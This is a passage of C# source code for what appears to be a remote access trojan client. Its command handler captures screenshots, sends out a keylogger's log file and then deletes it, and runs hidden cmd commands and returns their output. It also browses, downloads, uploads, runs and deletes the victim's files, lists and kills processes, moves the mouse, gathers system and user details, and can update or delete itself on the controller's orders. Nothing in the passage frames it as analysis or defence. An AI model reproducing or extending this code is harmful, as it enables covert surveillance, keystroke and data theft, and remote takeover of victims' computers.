            if (Major == 5 && Minor == 2) return "Windows 2003";
            if (Major == 6 && Minor == 0) return "Windows Vista";
            if (Major == 6 && Minor == 1) return "Windows 7";
            if (Major == 6 && Minor == 2) return "Windows 8";
            if (Major == 6 && Minor == 3) return "Windows 8.1";
            if (Major == 10 && Minor == 0) return "Windows 10";
            return "";

        }
        public static string GetMACAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
           
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card  
                {
                    //IPInterfaceProperties properties = adapter.GetIPProperties(); Line is not required
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            return sMacAddress;
        }
            static void client_RecievedEvent(System.IO.MemoryStream data)
            {
                BinaryReader br = new BinaryReader(data);
                Commands Header = (Commands)br.ReadInt32();

                switch (Header)
                {
                    case Commands.Image:
                        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics graphics = Graphics.FromImage(bitmap as Image);
                        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                        MemoryStream ms = new MemoryStream();
                        bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        Image img = resizeImage(Image.FromStream(ms), new Size(720, 480));
                        byte[] imagebyte = imageToByteArray(img);
                        MemoryStream ToSend = new MemoryStream();
                        BinaryWriter bw = new BinaryWriter(ToSend);
                        bw.Write((int)Commands.Image);
                        bw.Write(imagebyte.Length);
                        bw.Write(imagebyte);
                        ToSend.Position = 0;
                        byte[] ToSendArray = ToSend.ToArray();
                        sck.Send(BitConverter.GetBytes(ToSendArray.Length));
                        sck.Send(ToSendArray);

                        break;
                    case Commands.KeyLogger:
                        byte[] LogByte = new byte[] { };

                        try
                        {
                            LogByte = File.ReadAllBytes(KeyLoggerPath);

                            File.Delete(KeyLoggerPath);
                        }
                        catch { }
                        MemoryStream Ms = new MemoryStream();
                        BinaryWriter Bw = new BinaryWriter(Ms);
                        Bw.Write((int)Commands.KeyLogger);
                        Bw.Write(LogByte.Length);
                        Bw.Write(LogByte);
                        Ms.Position = 0;
                        byte[] SendArray = Ms.ToArray();
                        sck.Send(BitConverter.GetBytes(SendArray.Length));
                        sck.Send(SendArray);

                        break;

                    case Commands.Control:

                        int X = br.ReadInt32();

                        int Y = br.ReadInt32();
                        double Sx = Xmax / 720.0;
                        double Sy = Ymax / 480.0;
                        Cursor.Position = new Point(Convert.ToInt32(X * Sx), Convert.ToInt32(Y * Sy));


                        break;
                    case Commands.MouseClick:
                        DoMouseClick();
                        break;
                    case Commands.RightMouseClick:
                        DoRightMouseClick();
                        break;
                    case Commands.Upate:
                        byte[] UpdateFile = br.ReadBytes(br.ReadInt32());
                        Update(UpdateFile);

                        break;
                    case Commands.Cmd:
                        string Excute = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                        System.Diagnostics.ProcessStartInfo CmdStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", Excute);
                        CmdStartInfo.RedirectStandardOutput = true;
                        CmdStartInfo.UseShellExecute = false;
                        CmdStartInfo.CreateNoWindow = true;
                        Process Cmd = new Process();
                        Cmd.StartInfo = CmdStartInfo;
                        Cmd.Start();
                        byte[] OutPut = Encoding.Unicode.GetBytes(Cmd.StandardOutput.ReadToEnd());
                        MemoryStream MS = new MemoryStream();
                        BinaryWriter BW = new BinaryWriter(MS);
                        BW.Write((int)Commands.Cmd);
                        BW.Write(OutPut.Length);
                        BW.Write(OutPut);
                        byte[] TOSend = MS.ToArray();
                        sck.Send(BitConverter.GetBytes(TOSend.Length));
                        sck.Send(TOSend);
                        break;
                    case Commands.Directory:
                        MemoryStream ms2 = new MemoryStream();
                        BinaryWriter bw2 = new BinaryWriter(ms2);
                        bw2.Write((int)Commands.Directory);
                        foreach (DriveInfo Di in DriveInfo.GetDrives())
                        {
                            if (Di.IsReady)
                            {
                               TreeNode tree =  CreateDirectoryNode( new DirectoryInfo(Di.Name));
                               byte[] ToWrite = TreeNodesToBytes(tree);
                               bw2.Write(ToWrite.Length);
                               bw2.Write(ToWrite);
                               byte[] NameDirectory = Encoding.Unicode.GetBytes(Di.Name);
                               bw2.Write(NameDirectory.Length);
                               bw2.Write(NameDirectory);
                            }
                        }
                        bw2.Write(-1);
                        byte[] ToSend2 = ms2.ToArray();
                        sck.Send(BitConverter.GetBytes(ToSend2.Length));
                        sck.Send(ToSend2);
                

                        break;
                    case Commands.GetDisks:
                        MemoryStream ms3 = new MemoryStream();
                        BinaryWriter bw3 = new BinaryWriter(ms3);
                        bw3.Write((int)Commands.GetDisks);
                        DriveInfo[] Drivers = DriveInfo.GetDrives();
                     
                        foreach (DriveInfo Di in Drivers)
                        {
                            if (Di.IsReady)
                            {
                                byte[] Name = Encoding.Unicode.GetBytes(Di.Name);
                                bw3.Write(Name.Length);
                                bw3.Write(Name);

                            }

                        }
                        bw3.Write(-1);
                        byte[] ToSend3 = ms3.ToArray();
                        sck.Send(BitConverter.GetBytes(ToSend3.Length));
                        sck.Send(ToSend3);


                        break;
                    case Commands.SubDirectory:
                        string Path = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                        TreeNode Node = SubDirectoryNode(Path);
                        MemoryStream ms4 = new MemoryStream();
                        BinaryWriter bw4 = new BinaryWriter(ms4);
                        bw4.Write((int)Commands.SubDirectory);
                        byte[] PathByte = Encoding.Unicode.GetBytes(Path);
                        bw4.Write(PathByte.Length);
                        bw4.Write(PathByte);
                        byte[] ToWrite4 = TreeNodesToBytes(Node);
                               bw4.Write(ToWrite4.Length);
                               bw4.Write(ToWrite4);
                           byte[] ToSend4 = ms4.ToArray();
                        sck.Send(BitConverter.GetBytes(ToSend4.Length));
                        sck.Send(ToSend4);

                        break;
                    case Commands.Delete:
                        string path = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                        FileAttributes attr = File.GetAttributes(path);
                        if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                        {
                            try
                            {
                                Directory.Delete(path);
                            }
                            catch { }



                        }

                        else
                        {
                            try
                            {
                                File.Delete(path);
                            }
                            catch { }
                        }
              
                        break;
                    case Commands.Download:
                        string DownloadPath = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                        FileAttributes atr = File.GetAttributes(DownloadPath);
                    
                        MemoryStream Mem = new MemoryStream();
                        BinaryWriter Bin = new BinaryWriter(Mem);

                        if (!((atr & FileAttributes.Directory) == FileAttributes.Directory))
                        {
                            byte[] FileByte = File.ReadAllBytes(DownloadPath);
                            Bin.Write((int)Commands.Download);
                            Bin.Write(FileByte.Length);
                            Bin.Write(FileByte);
                            string Reverse = "";
                            for (int i = DownloadPath.Length - 1; i >= 0; i--)
                            {
                                if (DownloadPath[i] == '\\') break;
                                Reverse += DownloadPath[i];

                            }
                            string Name = "";
                            for (int i = Reverse.Length - 1; i >= 0; i--)
                                Name += Reverse[i];

                        
                            byte[] NameByte = Encoding.Unicode.GetBytes(Name);
                            Bin.Write(NameByte.Length);
                            Bin.Write(NameByte);
                            byte[] ToSend6 = Mem.ToArray();
                            sck.Send(BitConverter.GetBytes(ToSend6.Length));
                            sck.Send(ToSend6);
                       

                        }
                        else return;

                        break;
                    case Commands.Upload:
                        string PATH = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));

                        try
                        {
                            File.WriteAllBytes(PATH, br.ReadBytes(br.ReadInt32()));
                        }
                        catch { }

                        break; 
                    case Commands.Run:
                  
                        string RunPath = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                        Process p = new Process();
                        p.StartInfo.FileName = RunPath;
                        p.Start();
                        break;
                    case Commands.Process:
                        Process[] localAll = Process.GetProcesses();
                        MemoryStream MEM = new MemoryStream();
                        BinaryWriter BIN = new BinaryWriter(MEM);
                        BIN.Write((int)Commands.Process);
                        BIN.Write(localAll.Length);
                        foreach (Process i in localAll)
                        {
                       
                            byte[] ProcessName = Encoding.Unicode.GetBytes(i.ProcessName);
                            BIN.Write(ProcessName.Length);
                            BIN.Write(ProcessName);
                        }
                        byte[] ToSend9 = MEM.ToArray();
                        sck.Send(BitConverter.GetBytes(ToSend9.Length));
                        sck.Send(ToSend9);

                        break;
                    case Commands.CloseProcess:
                        string ProcessNameToClose = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                        Process[] Processes = Process.GetProcessesByName(ProcessNameToClose);
                        foreach (Process Pr in Processes)
                        {
                            try
                            {
                                //Pr.CloseMainWindow();
                                Pr.Kill();
                            }
                            catch { }
                        }

                        break;
                    case Commands.Information:

                        MemoryStream Memor = new MemoryStream();
                        BinaryWriter BinWr = new BinaryWriter(Memor);
                        BinWr.Write((int)Commands.Information);
                        byte[] OsInfo = Encoding.Unicode.GetBytes(GetOsInfo());
                        BinWr.Write(OsInfo.Length);
                        BinWr.Write(OsInfo);
                        byte[] Mac = Encoding.Unicode.GetBytes(GetMACAddress());
                        BinWr.Write(Mac.Length);
                        BinWr.Write(Mac);
                        byte[] PcName = Encoding.Unicode.GetBytes(Environment.UserDomainName);
                        byte[] UserName = Encoding.Unicode.GetBytes(Environment.UserName);
                        BinWr.Write(PcName.Length);
                        BinWr.Write(PcName);
                        BinWr.Write(UserName.Length);
                        BinWr.Write(UserName);

                        byte[] ToSendByte = Memor.ToArray();
                        sck.Send(BitConverter.GetBytes(ToSendByte.Length));
                        sck.Send(ToSendByte);

                    

                        break;
                    case Commands.DeleteServer:
                        DeleteServer();
                        break;
                    case Commands.CloseServer:
                        Environment.Exit(0);
                        break;
                    case Commands.RestartServer:
                        throw new Exception();
                        break;

                }


            }
    }
